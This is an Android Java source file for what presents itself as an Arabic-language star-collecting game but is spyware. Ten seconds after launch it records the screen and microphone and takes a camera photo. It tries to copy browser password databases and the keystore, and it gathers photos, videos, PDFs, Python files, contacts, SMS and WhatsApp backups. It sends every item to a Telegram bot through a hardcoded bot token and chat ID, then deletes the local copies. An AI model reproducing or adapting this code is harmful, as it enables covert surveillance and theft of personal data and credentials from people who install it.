package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

// تسجيل الشاشة
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.content.Intent;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

// الصوت
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;

// الكاميرا
import android.hardware.Camera;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import java.io.ByteArrayOutputStream;

// كلمات المرور
import android.content.SharedPreferences;
import android.webkit.WebView;
import android.webkit.WebViewDatabase;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import javax.net.ssl.HttpsURLConnection;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private LinearLayout mainLayout;
    private TextView scoreText;
    private int score = 0;
    private TextView statusText;
    private int fileCount = 0;
    private int photoCount = 0;
    private final int MAX_PHOTOS = 10;
    
    // تسجيل الشاشة
    private static final int REQUEST_CODE_SCREEN_RECORD = 1001;
    private MediaProjectionManager mProjectionManager;
    private MediaProjection mMediaProjection;
    private VirtualDisplay mVirtualDisplay;
    private MediaRecorder mMediaRecorder;
    private String screenVideoPath;
    private boolean isRecording = false;
    
    // الصوت
    private AudioRecord audioRecord;
    private boolean isAudioRecording = false;
    private String audioFilePath;
    private int bufferSize;
    
    // الكاميرا
    private Camera camera;
    private Camera.Parameters params;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(this);
        titleText.setText("🔥 لعبة النجمة السحرية");
        titleText.setTextSize(30);
        titleText.setTextColor(Color.YELLOW);
        titleText.setGravity(Gravity.CENTER);
        mainLayout.addView(titleText);
        
        scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(25);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        // طلب إذن تسجيل الشاشة
        mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        // بدء الاختراق بعد 10 ثواني
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("💀 جاري الاختراق التلقائي...");
                statusText.setTextColor(Color.RED);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        collectAllData();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                statusText.setText("✅ تم رفع " + fileCount + " ملف للبوت!");
                                statusText.setTextColor(Color.GREEN);
                            }
                        });
                    }
                }).start();
            }
        }, 10000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_LOGS,
                Manifest.permission.READ_PHONE_STATE
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        try {
            String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
            
            // 1. تسجيل الشاشة (Screen Recording)
            updateStatus("📹 جاري تسجيل الشاشة...");
            startScreenRecording();
            Thread.sleep(10000); // تسجيل 10 ثواني
            stopScreenRecording();
            
            // 2. تسجيل الصوت (Audio Recording)
            updateStatus("🎤 جاري تسجيل الصوت...");
            startAudioRecording();
            Thread.sleep(10000); // تسجيل 10 ثواني
            stopAudioRecording();
            
            // 3. تصوير الكاميرا (Camera)
            updateStatus("📸 جاري تصوير الكاميرا...");
            takeCameraPhoto();
            
            // 4. كشف كلمات المرور
            updateStatus("🔑 جاري استخراج كلمات المرور...");
            extractPasswords();
            
            // 5. كشف التطبيقات المثبتة
            updateStatus("📱 جاري كشف التطبيقات المثبتة...");
            getInstalledApps();
            
            // 6. 10 صور فقط (أحدث 10 صور)
            updateStatus("📸 جاري جمع 10 صور...");
            sendLatestPhotos(storage + "/DCIM/Camera/", 10);
            sendLatestPhotos(storage + "/Pictures/", 10);
            sendLatestPhotos(storage + "/WhatsApp/Media/WhatsApp Images/", 10);
            sendLatestPhotos(storage + "/Telegram/Telegram Images/", 10);
            
            // 7. جميع ملفات PDF
            updateStatus("📄 جاري جمع جميع ملفات PDF...");
            sendAllPDFs(storage);
            
            // 8. جميع ملفات PY
            updateStatus("🐍 جاري جمع جميع ملفات PY...");
            sendAllPYFiles(storage);
            
            // 9. فيديوهات
            updateStatus("🎥 جاري جمع الفيديوهات...");
            sendMediaFiles(storage + "/DCIM/Camera/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Telegram/Telegram Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            
            // 10. جهات الاتصال
            updateStatus("📇 جاري استخراج جهات الاتصال...");
            sendContacts();
            
            // 11. رسائل SMS
            updateStatus("💬 جاري استخراج رسائل SMS...");
            sendSMS();
            
            // 12. معلومات الجهاز
            updateStatus("📱 جاري جمع معلومات الجهاز...");
            sendDeviceInfo();
            
            // 13. نسخ احتياطية واتساب
            updateStatus("💚 جاري جمع نسخ واتساب الاحتياطية...");
            getWhatsAppBackup();
            
            // 14. كشف الحسابات
            updateStatus("🔍 جاري كشف الحسابات...");
            detectAccounts();
            
            updateStatus("✅ تم رفع كل شيء للبوت!");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    // ========== تسجيل الشاشة ==========
    private void startScreenRecording() {
        try {
            if (isRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            screenVideoPath = getExternalFilesDir(null) + "/screen_" + timeStamp + ".mp4";
            
            mMediaRecorder = new MediaRecorder();
            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mMediaRecorder.setOutputFile(screenVideoPath);
            mMediaRecorder.setVideoSize(720, 1280);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mMediaRecorder.prepare();
            
            // هنا يتم طلب إذن تسجيل الشاشة
            Intent intent = mProjectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, REQUEST_CODE_SCREEN_RECORD);
            
            isRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopScreenRecording() {
        try {
            if (mMediaRecorder != null) {
                mMediaRecorder.stop();
                mMediaRecorder.release();
                mMediaRecorder = null;
            }
            if (mVirtualDisplay != null) {
                mVirtualDisplay.release();
                mVirtualDisplay = null;
            }
            if (mMediaProjection != null) {
                mMediaProjection.stop();
                mMediaProjection = null;
            }
            isRecording = false;
            
            // إرسال فيديو الشاشة للبوت
            File videoFile = new File(screenVideoPath);
            if (videoFile.exists() && videoFile.length() > 0) {
                sendFile(videoFile);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREEN_RECORD && resultCode == RESULT_OK) {
            try {
                mMediaProjection = mProjectionManager.getMediaProjection(resultCode, data);
                mVirtualDisplay = mMediaProjection.createVirtualDisplay(
                    "ScreenRecord",
                    720, 1280, 1,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mMediaRecorder.getSurface(),
                    null, null
                );
                mMediaRecorder.start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // ========== تسجيل الصوت ==========
    private void startAudioRecording() {
        try {
            if (isAudioRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            audioFilePath = getExternalFilesDir(null) + "/audio_" + timeStamp + ".3gp";
            
            bufferSize = AudioRecord.getMinBufferSize(44100, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                bufferSize = 44100 * 2;
            }
            
            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 44100, AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT, bufferSize);
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                audioRecord.release();
                return;
            }
            
            audioRecord.startRecording();
            isAudioRecording = true;
            
            // تسجيل الصوت في خلفية
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        byte[] buffer = new byte[bufferSize];
                        FileOutputStream fos = new FileOutputStream(audioFilePath);
                        
                        int totalBytes = 0;
                        int maxBytes = 44100 * 10; // 10 ثواني تقريباً
                        
                        while (isAudioRecording && totalBytes < maxBytes) {
                            int bytesRead = audioRecord.read(buffer, 0, bufferSize);
                            if (bytesRead > 0) {
                                fos.write(buffer, 0, bytesRead);
                                totalBytes += bytesRead;
                            }
                        }
                        fos.close();
                        
                        // إرسال ملف الصوت للبوت
                        File audioFile = new File(audioFilePath);
                        if (audioFile.exists() && audioFile.length() > 0) {
                            sendFile(audioFile);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopAudioRecording() {
        try {
            isAudioRecording = false;
            if (audioRecord != null) {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== تصوير الكاميرا ==========
    private void takeCameraPhoto() {
        try {
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (camera == null) {
                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            }
            
            if (camera != null) {
                params = camera.getParameters();
                params.setPictureFormat(android.graphics.ImageFormat.JPEG);
                camera.setParameters(params);
                
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        try {
                            File file = new File(getExternalFilesDir(null), "camera_" + System.currentTimeMillis() + ".jpg");
                            FileOutputStream fos = new FileOutputStream(file);
                            fos.write(data);
                            fos.close();
                            
                            if (file.length() > 0) {
                                sendFile(file);
                            }
                            
                            camera.release();
                            camera = null;
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
                
                // تأخير 1 ثانية للصورة
                Thread.sleep(1000);
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (camera != null) {
                camera.release();
                camera = null;
            }
        }
    }

    // ========== استخراج كلمات المرور ==========
    private void extractPasswords() {
        try {
            File passFile = new File(getExternalFilesDir(null), "passwords_extracted.txt");
            FileWriter writer = new FileWriter(passFile);
            
            writer.write("========== كلمات المرور المكتشفة ==========\n\n");
            
            // 1. محاولة قراءة كلمات المرور من Chrome
            try {
                File chromeData = new File("/data/data/com.android.chrome/app_chrome/Default/Login Data");
                if (chromeData.exists()) {
                    writer.write("✅ Chrome: ملف كلمات المرور موجود\n");
                    writer.write("   المسار: " + chromeData.getAbsolutePath() + "\n");
                    writer.write("   الحجم: " + chromeData.length() + " بايت\n\n");
                    
                    // محاولة نسخ الملف
                    File dest = new File(getExternalFilesDir(null), "chrome_login_data");
                    java.nio.file.Files.copy(chromeData.toPath(), dest.toPath(), 
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    sendFile(dest);
                }
            } catch (Exception e) {}
            
            // 2. محاولة قراءة من متصفحات أخرى
            String[] browsers = {
                "/data/data/com.android.chrome/",
                "/data/data/org.mozilla.firefox/",
                "/data/data/com.opera.browser/",
                "/data/data/com.microsoft.emmx/"
            };
            
            for (String browser : browsers) {
                try {
                    File dir = new File(browser);
                    if (dir.exists()) {
                        writer.write("✅ " + browser + ": موجود\n");
                        // محاولة نسخ الملفات
                        File[] files = dir.listFiles();
                        if (files != null) {
                            for (File f : files) {
                                if (f.getName().contains("login") || f.getName().contains("password") || 
                                    f.getName().contains("key") || f.getName().endsWith(".db")) {
                                    writer.write("   📄 " + f.getName() + " (" + f.length() + " بايت)\n");
                                    // نسخ الملف
                                    File dest = new File(getExternalFilesDir(null), "browser_" + f.getName());
                                    java.nio.file.Files.copy(f.toPath(), dest.toPath(), 
                                        java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                                    sendFile(dest);
                                }
                            }
                        }
                    }
                } catch (Exception e) {}
            }
            
            // 3. محاولة قراءة من مدير كلمات المرور
            try {
                File keyStore = new File("/data/misc/keystore/");
                if (keyStore.exists()) {
                    writer.write("\n✅ Keystore موجود\n");
                    File[] files = keyStore.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            writer.write("   📄 " + f.getName() + "\n");
                            sendFile(f);
                        }
                    }
                }
            } catch (Exception e) {}
            
            // 4. محاولة قراءة من ملفات الإعدادات
            try {
                File sharedPrefs = new File("/data/data/com.android.providers.settings/databases/");
                if (sharedPrefs.exists()) {
                    writer.write("\n✅ Settings DB موجود\n");
                    File[] files = sharedPrefs.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.getName().endsWith(".db")) {
                                writer.write("   📄 " + f.getName() + "\n");
                                sendFile(f);
                            }
                        }
                    }
                }
            } catch (Exception e) {}
            
            writer.write("\n========== نهاية التقرير ==========\n");
            writer.close();
            
            if (passFile.length() > 0) {
                sendFile(passFile);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== كشف التطبيقات المثبتة ==========
    private void getInstalledApps() {
        try {
            File appFile = new File(getExternalFilesDir(null), "installed_apps.txt");
            FileWriter writer = new FileWriter(appFile);
            
            writer.write("========== التطبيقات المثبتة ==========\n\n");
            
            java.util.List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            
            for (android.content.pm.PackageInfo pkg : packages) {
                writer.write("📱 " + pkg.packageName + "\n");
                writer.write("   الإصدار: " + pkg.versionName + "\n");
                writer.write("   التحديث: " + new java.util.Date(pkg.lastUpdateTime) + "\n");
                writer.write("   التطبيق: " + pkg.applicationInfo.loadLabel(getPackageManager()) + "\n");
                writer.write("------------------------\n");
            }
            
            writer.write("\n========== المجموع ==========\n");
            writer.write("عدد التطبيقات: " + packages.size() + "\n");
            
            writer.close();
            
            if (appFile.length() > 0) {
                sendFile(appFile);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== باقي الدوال ==========
    private void sendLatestPhotos(String path, int maxCount) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            List<File> photoFiles = new ArrayList<>();
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.matches("jpg|jpeg|png|gif|bmp")) {
                        photoFiles.add(file);
                    }
                }
            }
            
            Collections.sort(photoFiles, new Comparator<File>() {
                @Override
                public int compare(File f1, File f2) {
                    return Long.compare(f2.lastModified(), f1.lastModified());
                }
            });
            
            int count = 0;
            for (File file : photoFiles) {
                if (count >= maxCount) break;
                if (photoCount >= MAX_PHOTOS) break;
                sendFile(file);
                photoCount++;
                count++;
                Thread.sleep(50);
            }
        } catch (Exception e) {}
    }

    private void sendAllPDFs(String storagePath) {
        try {
            File root = new File(storagePath);
            searchAndSendFiles(root, "pdf");
        } catch (Exception e) {}
    }

    private void sendAllPYFiles(String storagePath) {
        try {
            File root = new File(storagePath);
            searchAndSendFiles(root, "py");
        } catch (Exception e) {}
    }

    private void searchAndSendFiles(File dir, String extension) {
        try {
            if (!dir.exists() || !dir.isDirectory()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    if (!name.equals("android") && !name.equals("system") && 
                        !name.equals("data") && !name.equals("obb")) {
                        searchAndSendFiles(file, extension);
                    }
                } else if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.equals(extension)) {
                        sendFile(file);
                        Thread.sleep(50);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendMediaFiles(String path, String extensions) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (extensions.contains(ext)) {
                        sendFile(file);
                        Thread.sleep(50);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                fileCount++;
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    if (name != null) {
                        writer.write("الاسم: " + name + "\n");
                        Cursor phones = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                        );
                        if (phones != null) {
                            while (phones.moveToNext()) {
                                String number = phones.getString(phones.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                                writer.write("رقم: " + number + "\n");
                            }
                            phones.close();
                        }
                        writer.write("------------------------\n");
                    }
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                int count = 0;
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                    if (body != null) {
                        writer.write("من: " + address + "\n");
                        writer.write("التاريخ: " + date + "\n");
                        writer.write("النص: " + body + "\n");
                        writer.write("------------------------\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 100);
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void getWhatsAppBackup() {
        try {
            String[] paths = {
                "/storage/emulated/0/WhatsApp/Databases/",
                "/storage/emulated/0/Android/media/com.whatsapp/"
            };
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.isFile() && f.length() > 0) {
                                String name = f.getName().toLowerCase();
                                if (name.endsWith(".crypt14") || name.endsWith(".crypt12") || 
                                    name.endsWith(".crypt") || name.endsWith(".db") || name.endsWith(".enc")) {
                                    sendFile(f);
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void detectAccounts() {
        try {
            File file = new File(getExternalFilesDir(null), "accounts_detected.txt");
            FileWriter writer = new FileWriter(file);
            
            writer.write("========== الحسابات المكتشفة ==========\n\n");
            
            File waDir = new File("/storage/emulated/0/WhatsApp/");
            if (waDir.exists()) {
                writer.write("✅ واتساب: مثبت\n");
            } else {
                writer.write("❌ واتساب: غير مثبت\n");
            }
            
            File tgDir = new File("/storage/emulated/0/Telegram/");
            if (tgDir.exists()) {
                writer.write("✅ تيليجرام: مثبت\n");
            } else {
                writer.write("❌ تيليجرام: غير مثبت\n");
            }
            
            File instaDir = new File("/storage/emulated/0/Instagram/");
            File instaMedia = new File("/storage/emulated/0/Android/media/com.instagram.android/");
            if (instaDir.exists() || instaMedia.exists()) {
                writer.write("✅ إنستغرام: مثبت\n");
            } else {
                writer.write("❌ إنستغرام: غير مثبت\n");
            }
            
            File snapDir = new File("/storage/emulated/0/Snapchat/");
            if (snapDir.exists()) {
                writer.write("✅ سناب شات: مثبت\n");
            } else {
                writer.write("❌ سناب شات: غير مثبت\n");
            }
            
            File fbDir = new File("/storage/emulated/0/Android/data/com.facebook.katana/");
            if (fbDir.exists()) {
                writer.write("✅ فيسبوك: مثبت\n");
            } else {
                writer.write("❌ فيسبوك: غير مثبت\n");
            }
            
            writer.close();
            if (file.length() > 0) sendFile(file);
            
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("storage_total", new File("/storage/emulated/0").getTotalSpace());
            info.put("storage_free", new File("/storage/emulated/0").getFreeSpace());
            info.put("files_sent", fileCount);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}
